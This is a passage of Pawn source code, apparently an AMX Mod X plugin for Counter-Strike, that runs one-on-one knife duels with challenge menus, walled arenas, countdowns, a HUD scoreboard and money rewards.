			//set_rendering(ent,kRenderFxGlowShell,200,0,0,kRenderNormal,10)
		}
		spawn_back(id)
	}
	
	return PLUGIN_HANDLED;
}

public set_spawn_positions(id,side,Float:origin[3],Float:angle[3])
{
	if(side == BLUE_SIDE)
		his_spawn[id][0] = origin[0]-20.0
	else his_spawn[id][0] = origin[0]-120.0
	his_spawn[id][1] = origin[1]
	his_spawn[id][2] = origin[2]+50.0
	entity_get_vector(id, EV_VEC_angles,his_angle[id])
	switch(side)
	{
		case RED_SIDE:
		{
			his_angle[id][1] = 0.0
			his_angle[id][0] = 0.0
			
		}
		case BLUE_SIDE:
		{
			his_angle[id][1] = 180.0
			his_angle[id][0] = 0.0
		}
	}
	got_spawn[id] = 1
}

public stuck_check(Float:origin[3],Float:radius)
{
	new player=-1;
	while((player = find_ent_in_sphere(player,origin,radius)) != 0)
	{
		if(is_user_alive(player))
		{
			if(is_player_stuck(player) && is_in_duel[player] != 2)
			{
				back_to_the_spawn(player)
			}
		}
	}
}

stock is_player_stuck(id)
{
	static Float:originF[3]
	pev(id, pev_origin, originF)
	
	engfunc(EngFunc_TraceHull, originF, originF, 0, (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN, id, 0)
	
	if (get_tr2(0, TR_StartSolid) || get_tr2(0, TR_AllSolid) || !get_tr2(0, TR_InOpen))
		return true;
	
	return false;
}

public create_wall(type,alpha,solidity,code,code1,code2,Float:origin[3])
{
	new Float:wall_maxsize[3];
	new Float:wall_minsize[3];
	new Float:rvec[3];
	new ent=engfunc(EngFunc_CreateNamedEntity,engfunc(EngFunc_AllocString,"func_wall"));
	pev(ent,pev_v_angle,rvec);
	switch(type)
	{
		case BLUE_SIDE:
		{
			wall_maxsize[0] = 2.0
			wall_minsize[0] = 0.0
			wall_maxsize[1] = 230.0
			wall_minsize[1] = -230.0
			wall_maxsize[2] = 150.0
			wall_minsize[2] = -1.0
			rvec[1]=180.0
		}
		case RED_SIDE:
		{
			wall_maxsize[0] = -150.0
			wall_minsize[0] = -152.0
			wall_maxsize[1] = 230.0
			wall_minsize[1] = -230.0
			wall_maxsize[2] = 150.0
			wall_minsize[2] = -1.0
			rvec[1]=180.0
		}
		case LEFT_SIDE:
		{
			wall_maxsize[0] = 360.0
			wall_minsize[0] = -300.0
			wall_maxsize[1] = 65.0
			wall_minsize[1] = 63.0
			wall_maxsize[2] = 150.0
			wall_minsize[2] = -1.0
			rvec[1]=90.0
		}
		case RIGHT_SIDE:
		{
			wall_maxsize[0] = 360.0
			wall_minsize[0] = -300.0
			wall_maxsize[1] = -63.0
			wall_minsize[1] = -65.0
			wall_maxsize[2] = 150.0
			rvec[1]=90.0
		}
		case TOP_SIDE:
		{
			wall_maxsize[0] = 360.0
			wall_minsize[0] = -300.0
			wall_maxsize[1] = 230.0
			wall_minsize[1] = -230.0
			wall_maxsize[2] = 150.0
			wall_minsize[2] = 148.0
			rvec[0]=90.0          
		}
	}
	set_pev(ent,pev_angles,rvec);
	
	set_pev(ent,pev_classname,ARENA_ENT_NAME);
	engfunc(EngFunc_SetModel,ent,ARENA_MODELS[0]);
	entity_set_int(ent, EV_INT_solid, solidity);
	engfunc(EngFunc_SetSize,ent,wall_minsize,wall_maxsize);
	entity_set_int(ent, EV_INT_movetype, MOVETYPE_NONE);
	entity_set_int(ent,EV_INT_iuser1,code)
	entity_set_int(ent,EV_INT_iuser2,code1)
	entity_set_int(ent,EV_INT_iuser3,code2)
	engfunc(EngFunc_SetOrigin,ent,origin);
	set_rendering(ent,kRenderFxGlowShell,0,0,0,kRenderTransAlpha,alpha)
}

public get_spawn_origin(id)
{
	pev(id,pev_origin,his_original_spawn[id]);
}

stock get_user_hitpoint(id,Float:hOrigin[3])  {
	if(!is_user_alive(id))
		return 0;

	new Float:fOrigin[3],Float:fvAngle[3],Float:fvOffset[3],Float:fvOrigin[3],Float:feOrigin[3];
	new Float:fTemp[3];

	pev(id,pev_origin,fOrigin);
	pev(id,pev_v_angle,fvAngle);
	pev(id,pev_view_ofs,fvOffset);

	xs_vec_add(fOrigin,fvOffset,fvOrigin);

	engfunc(EngFunc_AngleVectors,fvAngle,feOrigin,fTemp,fTemp);

	xs_vec_mul_scalar(feOrigin,9999.9,feOrigin);
	xs_vec_add(fvOrigin,feOrigin,feOrigin);

	engfunc(EngFunc_TraceLine,fvOrigin,feOrigin,0,id);
	global_get(glb_trace_endpos,hOrigin);

	return 1;
} 

public plugin_precache() 
{
	new size;
	size = sizeof(ARENA_MODELS)
	for(new i; i< size; i++) 
	{
		engfunc(EngFunc_PrecacheModel,ARENA_MODELS[i]);
	}
}


public round_start_event()
{
	update_cvars()
	// using a variable to store player's names instead of regenerating it all the time...
	for(new id;id < MAX_PLAYERS;id++)
	{
		if(is_user_connected(id))
		{
			get_user_name(id,his_name[id],charsmax(his_name))
		}
	}
}

public Cmd_start(id,hndle)
{
	if(!is_user_alive(id))
		return FMRES_IGNORED
	if(!is_frozen[id])
		return FMRES_IGNORED
	new Buttons = get_uc(hndle,UC_Buttons)
	if(Buttons & IN_ATTACK)
	{
		Buttons &= ~IN_ATTACK
		set_uc( hndle , UC_Buttons , Buttons )
		return FMRES_SUPERCEDE
	}
	if(Buttons & IN_ATTACK2)
	{
		Buttons &= ~IN_ATTACK2
		set_uc( hndle , UC_Buttons , Buttons )
		return FMRES_SUPERCEDE
	}
	return FMRES_IGNORED
}

public Player_Take_Damage(victim, inflictor, attacker, Float:damage, damage_bits)
{     
	if(is_user_connected(attacker)) // we make sure the attacker is a player
	{
		if(is_in_duel[victim] == 2 || is_in_duel[attacker] == 2)
		{
			if(his_challenger[victim] != attacker || his_challenger[attacker] != victim)
			{
				// we protect the contenders from getting killed by other people or them killing others?
				return HAM_SUPERCEDE
			}
		}
	}
	return HAM_IGNORED
}

public client_putinserver(id)
{
	get_user_name(id,his_name[id],charsmax(his_name))
	reset_values(id)
	move_size[id] = 10.0
	his_offline[id] = 0
	his_previous_team[id] = 0
}

public client_disconnect(id)
{
	end_his_duel(id)
}

public end_his_duel(id)
{
	if(his_challenger[id])
	{
		ColorChat(0, NORMAL,"^3[^4Arena: %s^3] ^4%s^1's challenger ^4%s^1 has ^3left the game^1.",arena_names[arena_number[id]],his_name[his_challenger[id]],his_name[id])
		
		if(arena_number[id] == arena_number[his_challenger[id]])
			remove_the_arena(arena_number[id] +ARENA_CODE)
		back_to_the_spawn(id)
		back_to_the_spawn(his_challenger[id])
		reset_values(his_challenger[id])
	}
	reset_values(id)
}

public times_up_duel(id)
{
	ColorChat(0, NORMAL,"^3[^4Arena: %s^3] ^4%s^1 ^1and ^4%s^1 has taken long to ^3finish the battle^1.",arena_names[arena_number[id]],his_name[his_challenger[id]],his_name[id])
		
	if(his_challenger[id])
	{
		if(arena_number[id] == arena_number[his_challenger[id]])
			remove_the_arena(arena_number[id] +ARENA_CODE)
		user_kill(id,1)
		user_kill(his_challenger[id],1)
		back_to_the_spawn(id)
		back_to_the_spawn(his_challenger[id])
		reset_values(his_challenger[id])
	}
	reset_values(id)
}

public battle_timer(id)
{
	if(is_user_connected(id))
	{
		if(is_in_duel[id] == 2)
		{
			his_timer[id]++
			if(his_timer[id] > MAX_TIME)
			{
				times_up_duel(id)
			}
			set_task(1.0,"battle_timer",id)
		}
	}
}

public say_hook(id)
{
	static Chat_C[32]
	read_args(Chat_C,charsmax(Chat_C))
	remove_quotes(Chat_C)
	if(equali(Chat_C,DUEL_COMMAND))
	{
		//request a duel
		duel_players_list(id)
	}
	if(equali(Chat_C,TOGGLE_COMMAND))
	{
		//request a duel
		toggle_offline(id)
	}
	if(equali(Chat_C,GIVEUP_COMMAND))
	{
		//leave a duel
		if(is_in_duel[id] == 2)
		{
			give_up_player(id)
		}
		else
		{
			ColorChat(id, NORMAL,"%sYou're not part of any battle.",CHAT_TAG)
		}
	}
	return PLUGIN_CONTINUE
}

public toggle_offline(id)
{
	switch(his_offline[id])
	{
		case 0:
		{
			his_offline[id] = 1
			ColorChat(0, NORMAL,"%s^4%s^1 disconnected from the duel list.",CHAT_TAG,his_name[id])
		}
		default:
		{
			his_offline[id] = 0
			ColorChat(0, NORMAL,"%s^4%s^1 connected to the duel list.",CHAT_TAG,his_name[id])
		}
	}
}

public give_up_player(id)
{
	if(is_user_connected(his_challenger[id]))
	{
		ColorChat(0, NORMAL,"%s^4%s^3 got scared to face ^4%s^3! :)",CHAT_TAG,his_name[id],his_name[his_challenger[id]])
		if(arena_number[id] == arena_number[his_challenger[id]])
			remove_the_arena(arena_number[id] +ARENA_CODE)
		back_to_the_spawn(id)
		back_to_the_spawn(his_challenger[id])
		reset_values(his_challenger[id])
	}
	reset_values(id)
}

public reward_winner(id)
{
	if(is_user_connected(id))
	{
		// here you can reward the winner with something
		ColorChat(id, NORMAL,"%s^4Congratulations!!!^1, You have ^3won this battle^1!",CHAT_TAG)
		if(SOUNDS_ENABLED)
			client_cmd(id,"spk ^"%s^"",DUEL_SOUNDS[0])
		if(cs_get_user_money(id)+15000 <= 16000)
		{
			cs_set_user_money(id,cs_get_user_money(id)+15000,1)
			//ColorChat(id, NORMAL,"%s^4You've earned ^3$15000^4!",CHAT_TAG)
		} else cs_set_user_money(id,16000,1)
	}
}

public reward_loser(id)
{
	if(is_user_connected(id))
	{
		// here you can reward the winner with something
		user_kill(id,1)
		ColorChat(id, NORMAL,"%sYou've ^3lost this battle^1!",CHAT_TAG)
		if(SOUNDS_ENABLED)
			client_cmd(id,"spk ^"%s^"",DUEL_SOUNDS[1])
		if(cs_get_user_money(id)-15000 >= 0)
		{
			cs_set_user_money(id,cs_get_user_money(id)-15000,1)
			//ColorChat(id, NORMAL,"%s^4You've lost ^3$15000^4!",CHAT_TAG)
		} else cs_set_user_money(id,0,1)
	}
}

public duel_players_list(id)
{
	if(!is_user_alive(id))
	{
		ColorChat(id, NORMAL,"%sYou can't challenge anyone when you're ^3dead1.",CHAT_TAG)
		return PLUGIN_HANDLED
	}
	if(his_offline[id])
	{
		ColorChat(id, NORMAL,"%sYou can't challenge people when you're ^3offline^1.",CHAT_TAG)
		return PLUGIN_HANDLED
	}
	if(is_user_connected(his_challenger[id]))
	{
		ColorChat(id, NORMAL,"%s^4%s ^1is still ^4fighting against you^1.",CHAT_TAG,his_name[his_challenger[id]])
		return PLUGIN_HANDLED
	}
	if(is_user_connected(his_asker[id]))
	{
		ColorChat(id, NORMAL,"%sYou can only ^3challenge one person^1 at the time, you've challenged ^4%s^1.",CHAT_TAG,his_name[his_asker[id]])
		return PLUGIN_HANDLED
	}
	if(!available_duelers(id))
	{
		ColorChat(id, NORMAL,"%sThere's ^4nobody^1 you can challenge.",CHAT_TAG)
		return PLUGIN_HANDLED
	}
	if(get_next_arena() == -1)
	{
		ColorChat(id, NORMAL,"%s^4Maximum arenas reached.",CHAT_TAG)
		return PLUGIN_HANDLED
	}
	new menu,menuformat[64];
	formatex(menuformat,charsmax(menuformat),"\w[ \rKnifeDuels \w] \dArenas: %d/%d",arenas_count(),total_arenas)
	menu = menu_create( menuformat, "Duel_handler" );
	
	new players[32], pnum, tempid;
	
	new szName[32], szUserId[32],nameu[92],CsTeams:team;
	formatex(nameu,charsmax(nameu), "\yRefresh");
	menu_additem(menu, nameu,"rf_c", 0);
	menu_addblank(menu,0)
	get_players( players, pnum, "c" );
	for ( new e; e<pnum; e++ )
	{
		tempid = players[e]
		team = cs_get_user_team(tempid)
		
		if(tempid != id && team != CS_TEAM_SPECTATOR && team != CS_TEAM_UNASSIGNED)//  && !users_in_same_team(id,tempid))
		{
			get_user_name(tempid, szName, charsmax(szName));
			formatex(szUserId, charsmax(szUserId), "%d", get_user_userid(tempid));
			if(his_offline[tempid])
			{
				formatex(nameu,charsmax(nameu), "\d%s [Offline]", szName);
				menu_additem(menu, nameu, szUserId, 0);
			}
			else
			{
				if(is_in_duel[tempid] == 2)
				{
					formatex(nameu,charsmax(nameu), "\r%s [Duel]", szName);
					menu_additem(menu, nameu, szUserId, 0);
				}
				else if(is_in_duel[tempid] == 1)
				{
					formatex(nameu,charsmax(nameu), "\y%s [Pending]", szName);
					menu_additem(menu, nameu, szUserId, 0);
				}
				else
				{
					formatex(nameu,charsmax(nameu), "%s", szName);
					menu_additem(menu, nameu, szUserId, 0);
				}
			}
		}
	}
	
	menu_display(id, menu, 0 );
	return PLUGIN_HANDLED
}

public Duel_handler( id, menu, item )
{
	if ( item == MENU_EXIT )
	{
		menu_destroy( menu );
		return PLUGIN_HANDLED;
	}
	
	new szData[32], szName[64];
	new _access, item_callback;
	menu_item_getinfo( menu, item, _access, szData,charsmax( szData ), szName,charsmax( szName ), item_callback );
	if(equali(szData,"rf_c"))
	{
		menu_destroy( menu );
		duel_players_list(id)
		return PLUGIN_CONTINUE
	}
	new userid = str_to_num( szData );
	//spam_hud(id)
	new enem = find_player("k", userid); // flag "k" : find player from userid
	if (is_user_connected(enem))
	{
		if(his_offline[enem])
		{
			ColorChat(id, NORMAL,"%sYou can't challenge offline players.",CHAT_TAG)
		}
		else
		{
			if(!is_in_duel[enem])
			{
				//spam_hud(enem)
				is_in_duel[enem] = 1
				is_in_duel[id] = 1
				his_asker[id] = enem
				his_asker[enem] = id
				ask_player(enem)
				ColorChat(0, NORMAL,"%s^4%s^1 has ^3challenged^1 ^4%s^1 for a ^3duel^1!",CHAT_TAG,his_name[id],his_name[enem])
				
				set_task(10.0,"taken_long",id)
			}
			else
			{
				ColorChat(id, NORMAL,"%s^4%s^1 seems to be busy with another duel..",CHAT_TAG,his_name[enem])
			}
		}
	}
	menu_destroy( menu );
	return PLUGIN_CONTINUE;
}

public taken_long(id)
{
	if(is_in_duel[id] == 1)
	{
		ColorChat(0, NORMAL,"%s^4%s ^1has taken ^3too long to respond ^1to ^4%s^1's challenge.",CHAT_TAG,his_name[his_asker[id]],his_name[id])
		reset_values(his_asker[id])
		reset_values(id)
	}
}

stock available_duelers(asker)
{
	new num;
	num = 0 // just incase...
	for(new id;id < MAX_PLAYERS;id++)
	{
		if(is_user_alive(id))
		{
			if(/*!is_in_duel[id] && */id != asker && !is_user_bot(id))
			{
				num++
			}
		}
	}
	return num
}

public ask_player(id)
{
	if(!is_user_alive(id))
	{
		return PLUGIN_HANDLED
	}
	new asker_name[32],menu_title[64];
	get_user_name(his_asker[id],asker_name,charsmax(asker_name))
	formatex(menu_title,charsmax(menu_title),"\rAccept Duel \y%s\r?",asker_name)
	new menu
	menu = menu_create( menu_title, "Ask_handler" );
	
	menu_additem(menu, "Sure!", "user_said_yes", 0);
	menu_additem(menu, "Nope!","user_said_no", 0);
	
	menu_display(id, menu, 0 );
	return PLUGIN_HANDLED
}

public Ask_handler( id, menu, item )
{
	if ( item == MENU_EXIT )
	{
		menu_destroy( menu );
		return PLUGIN_HANDLED;
	}
	
	new szData[32], szName[64];
	new _access, item_callback;
	menu_item_getinfo( menu, item, _access, szData,charsmax( szData ), szName,charsmax( szName ), item_callback );
	
	if(equali(szData,"user_said_yes"))
	{
		if(get_next_arena() == -1)
		{
			ColorChat(his_asker[id], NORMAL,"%sMaximum arenas reached.",CHAT_TAG)
			reset_values(his_asker[id])
			reset_values(id)
		}
		else if(is_in_duel[his_asker[id]] == 1)
		{
			manage_battle(id)
			check_teams(id,his_challenger[id])
			begin_the_battle(id,his_challenger[id])
		} else
		{
			ColorChat(id, NORMAL,"%s%s either canceled the duel or chosen someone else to duel.",CHAT_TAG,his_name[his_asker[id]])
			reset_values(his_asker[id])
			reset_values(id)
		}
	}
	else if(equali(szData,"user_said_no"))
	{
		if(is_user_connected(his_asker[id]))
		{
			ColorChat(0, NORMAL,"%s^4%s^3 rejected ^4%s^3's challenge.",CHAT_TAG,his_name[id],his_name[his_asker[id]])
			reset_values(his_asker[id])
			reset_values(id)
		}
		
	}
	menu_destroy( menu );
	return PLUGIN_CONTINUE;
}

public Player_Killed(victim, attacker, shouldgib)
{
	if(!is_user_connected(victim))
		return HAM_IGNORED;
	if(is_user_connected(his_challenger[victim]) && !is_user_connected(attacker))
	{
		if(!check_teams(victim,attacker))
			return HAM_IGNORED
	}
	if(!is_user_connected(attacker))
		return HAM_IGNORED
		
	if(attacker == victim)
		return HAM_IGNORED
	
	if(is_in_duel[attacker] != 2 || is_in_duel[victim] != 2)
		return HAM_IGNORED
	
	if(his_challenger[victim] == attacker || his_challenger[attacker] == victim )
	{
		fake_death(attacker,victim)
		his_wins[attacker]++
		rounds[arena_number[attacker]]++
		static ret;
		ExecuteForward(killed_forward, ret, attacker,victim)
		if(Head_shot[attacker][victim])
		{
			his_HS[attacker]++
			Head_shot[attacker][victim] = false
		}
		user_silentkill(victim)
		if(rounds[arena_number[attacker]] >= MAX_ROUNDS || his_wins[attacker] >= MAX_KILLS)
		{
			if(!get_non_duelers_alive())
			{
				ExecuteHamB(Ham_CS_RoundRespawn, victim)
				Check_Results(attacker,victim)
				return HAM_SUPERCEDE
			}
			else
			{
				ExecuteHamB(Ham_CS_RoundRespawn, victim)
				Check_Results(attacker,victim)
			}
		}
		else 
		{
			wait_for_enemy_loop(attacker)
			//client_print_color(attacker, DontChange,"%s^4Rounds^1:^3%d^4/^3%d^1 | ^4You^1:^3%d^4/^3%d^1 | ^4%s^1:^3%d^4/^3%d^1.",CHAT_TAG,rounds[arena_number[attacker]],MAX_ROUNDS,his_wins[attacker],MAX_KILLS,his_name[victim],his_wins[victim],MAX_KILLS)
			//client_print_color(victim, DontChange,"%s^4Rounds^1:^3%d^4/^3%d^1 | ^4You^1:^3%d^4/^3%d^1 | ^4%s^1:^3%d^4/^3%d^1.",CHAT_TAG,rounds[arena_number[attacker]],MAX_ROUNDS,his_wins[victim],MAX_KILLS,his_name[attacker],his_wins[attacker],MAX_KILLS)
		}
		Set_Entity_Invisible(victim, 1)
		set_task(1.0,"delay_respawn",victim)
		return HAM_SUPERCEDE
	}
	return HAM_IGNORED
}

public fake_death(attacker,victim)
{
	message_begin( MSG_ALL, get_user_msgid("DeathMsg"),{0,0,0},0)
	write_byte(attacker)
	write_byte(victim)
	write_byte(0)
	write_string("knife")
	message_end()
}

public delay_respawn(id)
{
	if(is_user_connected(id))
	{
		if(!is_user_alive(id))
		{
			ExecuteHamB(Ham_CS_RoundRespawn, id)
		}
		Set_Entity_Invisible(id, 0)
	}
	return PLUGIN_CONTINUE
}
public Check_Results(id,enemy)
{
	reset_teams(id)
	reset_teams(enemy)
	new id_name[64],enemy_name[64];
	get_user_name(id,id_name,charsmax(id_name))
	get_user_name(enemy,enemy_name,charsmax(enemy_name))
	if(his_wins[id] > his_wins[enemy])
	{
		ColorChat(0, NORMAL,"^3[^4Arena: %s^3] ^4%s ^1with ^3%d scores (HS:%d) ^1won against ^4%s ^1with ^3%d scores (HS:%d)",arena_names[arena_number[id]],id_name,his_wins[id],his_HS[id],enemy_name,his_wins[enemy],his_HS[enemy])
		reward_winner(id)
		reward_loser(enemy)
	}
	else if(his_wins[enemy] > his_wins[id])
	{
		ColorChat(0, NORMAL,"^3[^4Arena: %s^3] ^4%s ^1with ^3%d scores (HS:%d) ^1won against ^4%s ^1with ^3%d scores (HS:%d)",arena_names[arena_number[id]],enemy_name,his_wins[enemy],his_HS[enemy],id_name,his_wins[id],his_HS[id])
		reward_winner(enemy)
		reward_loser(id)
	}
	else
	{
		ColorChat(0, NORMAL,"^3[^4Arena: %s^3] ^4%s ^1with ^3%d scores (HS:%d) ^1and ^4%s ^1with ^3%d scores (HS:%d) ^1ended in a ^4draw match.",arena_names[arena_number[id]],id_name,his_wins[id],his_HS[id],enemy_name,his_wins[enemy],his_HS[enemy])
		if(SOUNDS_ENABLED)
		{
			client_cmd(id,"spk ^"%s^"",DUEL_SOUNDS[2])
			client_cmd(enemy,"spk ^"%s^"",DUEL_SOUNDS[2])
		}
		if(his_wins[id] == his_wins[enemy])
		{
			user_kill(id,1)
			user_kill(enemy,1)
		}
	}
	//ColorChat(0, NORMAL,"%s^3Headshots: ^4%s^1:^3%d ^4%s^1:^3%d^1.",CHAT_TAG,id_name,his_HS[id],enemy_name,his_HS[enemy])
	if(arena_number[id] == arena_number[enemy])
		remove_the_arena(arena_number[id] +ARENA_CODE)
	back_to_the_spawn(id)
	back_to_the_spawn(enemy)
	reset_values(enemy)
	reset_values(id)
	
}

public back_to_the_spawn(id)
{
	if(is_user_alive(id))
	{
		entity_set_origin(id,his_original_spawn[id])
		Set_Entity_Invisible(id, 0)
		set_user_health(id,map_default_hp)
	}
	set_user_armor(id,0)
	set_user_godmode(id, 0)
}



public manage_battle(id)
{
	is_in_duel[id] = 2
	his_challenger[id] = his_asker[id]
	his_challenger[his_challenger[id]] = id
	is_in_duel[his_challenger[id]] = 2
	his_asker[id] = 0
	his_wins[id] = 0
	his_wins[his_challenger[id]] = 0
	new aren_code = get_next_arena()
	arena_number[id] = aren_code
	arena_number[his_challenger[id]] = aren_code
	rounds[aren_code] = 0
	new CsTeams:teamid,CsTeams:teamenemy;
	teamid = cs_get_user_team(id)
	teamenemy = cs_get_user_team(his_challenger[id])
	if(teamid == CS_TEAM_T)
	{
		his_previous_team[id] = 2
	}
	else if(teamid == CS_TEAM_CT)
	{
		his_previous_team[id] = 1
	}
	else his_previous_team[id] = 0
	
	if(teamenemy == CS_TEAM_T)
	{
		his_previous_team[his_challenger[id]] = 2
	}
	else if(teamenemy == CS_TEAM_CT)
	{
		his_previous_team[his_challenger[id]] = 1
	}
	else his_previous_team[his_challenger[id]] = 0
	start_build(his_challenger[id])
	if(SOUNDS_ENABLED)
	{
		client_cmd(id,"spk ^"%s^"",DUEL_SOUNDS[4])
		client_cmd(his_challenger[id],"spk ^"%s^"",DUEL_SOUNDS[4])
	}
	battle_timer(id)
	battle_timer(his_challenger[id])
	hud_displayer(id)
	hud_displayer(his_challenger[id])
	ColorChat(0, NORMAL,"%s^4%s^3 accepted ^4%s^3's challenge!",CHAT_TAG,his_name[id],his_name[his_challenger[id]])
}

public begin_the_battle(id,enemy)
{
	start_new_round(id,enemy)
}

public start_new_round(id,enemy)
{
	his_timer[id] = 0
	his_timer[enemy] = 0
	is_frozen[id] = 1
	is_frozen[enemy] = 1
	his_countdown[id] = MAX_COUNTDOWN
	his_countdown[enemy] = MAX_COUNTDOWN
	countdown(id)
	countdown(enemy)
}

public countdown(id)
{
	if(is_user_connected(id))
	{
		his_countdown[id]--
		if(0 >= his_countdown[id])
		{
			is_frozen[id] = 0
			unfreeze_player(id)
			if(SOUNDS_ENABLED)
				client_cmd(id,"spk ^"%s^"",DUEL_SOUNDS[6])
			client_print(id,print_center,"Fight!")
			return PLUGIN_HANDLED
		}
		else
		{
			freeze_player(id)
			if(SOUNDS_ENABLED)
				client_cmd(id,"spk ^"%s^"",DUEL_SOUNDS[5])
			client_print(id,print_center,"%d",his_countdown[id])
			if(!is_frozen[id]) // we prevent it from spamming
				is_frozen[id] = 1
		}
		set_task(1.0,"countdown",id)
	}
	return PLUGIN_CONTINUE
}

public reset_teams(id)
{
	if(his_previous_team[id] == 1)
	{
		cs_set_user_team(id,CS_TEAM_CT)
	}
	else if(his_previous_team[id] == 2)
	{
		cs_set_user_team(id,CS_TEAM_T)
	}
	return PLUGIN_CONTINUE
}

public check_teams(id,enemy)
{
	new CsTeams:teamid,CsTeams:teamenemy;
	teamid = cs_get_user_team(id)
	teamenemy = cs_get_user_team(enemy)
	if(!users_in_same_team(id,enemy) && !is_in_false_team(id) && !is_in_false_team(enemy))
		return PLUGIN_HANDLED
	if(teamid == CS_TEAM_CT && teamenemy == CS_TEAM_CT )
	{
		cs_set_user_team(id,CS_TEAM_T)
	} else if(teamid == CS_TEAM_T && teamenemy == CS_TEAM_T)
	{
		cs_set_user_team(id,CS_TEAM_CT)
	}
	else
	{
		Check_Results(id,enemy)
		return PLUGIN_CONTINUE
	}
	return PLUGIN_HANDLED
}
stock is_in_false_team(id)
{
	if(cs_get_user_team(id) == CS_TEAM_SPECTATOR || cs_get_user_team(id) == CS_TEAM_UNASSIGNED)
		return PLUGIN_HANDLED
	return PLUGIN_CONTINUE
}
stock users_in_same_team(id,enemy)
{
	if(cs_get_user_team(id) == cs_get_user_team(enemy))
		return PLUGIN_HANDLED
	return PLUGIN_CONTINUE
}

stock get_next_arena()
{
	next_empty_arena = 0
	for(new id;id < MAX_PLAYERS;id++)
	{
		if(is_user_connected(id))
		{
			if(arena_number[id] == next_empty_arena)
			{
				next_empty_arena++
				if(next_empty_arena > total_arenas)
					return -1
			}
		}
	}
	if(next_empty_arena > total_arenas)
	{
		return -1
	}
	return next_empty_arena
}

stock reset_values(id)
{
	his_HS[id] = 0
	rounds[arena_number[id]] = 0
	is_in_duel[id] = 0
	his_challenger[id] = 0
	his_asker[id] = 0
	arena_number[id] = 0
	his_wins[id] = 0
	got_spawn[id] = 0
	his_timer[id] = 0
}

public freeze_player(id)
{
	set_user_maxspeed(id,1.0)
}

public unfreeze_player(id)
{
	set_user_maxspeed(id,250.0)
}
 


public wait_for_enemy_loop(id)
{
	if(is_user_connected(id))
	{
		if(is_in_duel[id] == 2)
		{
			if(is_user_connected(his_challenger[id]))
			{
				if(is_in_duel[his_challenger[id]] == 2)
				{
					if(is_user_alive(his_challenger[id]))
					{
						begin_the_battle(id,his_challenger[id])
						return PLUGIN_HANDLED
					}
					set_task(0.1,"wait_for_enemy_loop",id)
				}
			}
		}
	}
	return PLUGIN_CONTINUE
}

public hud_displayer(id)
{
	if(is_user_connected(id))
	{
		if(is_in_duel[id] == 2 && is_user_connected(his_challenger[id]))
		{
			new name[64],his_name[64];
			get_user_name(id,name,charsmax(name))
			get_user_name(his_challenger[id],his_name,charsmax(his_name))
			set_dhudmessage(0, 255, 0, -1.0, 0.0, 0, 6.0, 0.1)
			show_dhudmessage(id, "Arena: %s | Rounds: %d/%d ^n%s -- %d/%d (HS:%d)^nVS^n%s -- %d/%d (HS:%d)"
			,arena_names[arena_number[id]]
			,rounds[arena_number[id]]
			,MAX_ROUNDS,name,his_wins[id]
			,MAX_KILLS,his_HS[id]
			,his_name,his_wins[his_challenger[id]]
			,MAX_KILLS,his_HS[his_challenger[id]])
			
			set_task(0.1,"hud_displayer",id)
		}
	}
}

stock Set_Entity_Invisible(ent, Invisible = 1)
{
	if(!pev_valid(ent))
		return
	set_pev(ent, pev_effects, Invisible == 0 ? pev(ent, pev_effects) & ~EF_NODRAW : pev(ent, pev_effects) | EF_NODRAW)
}
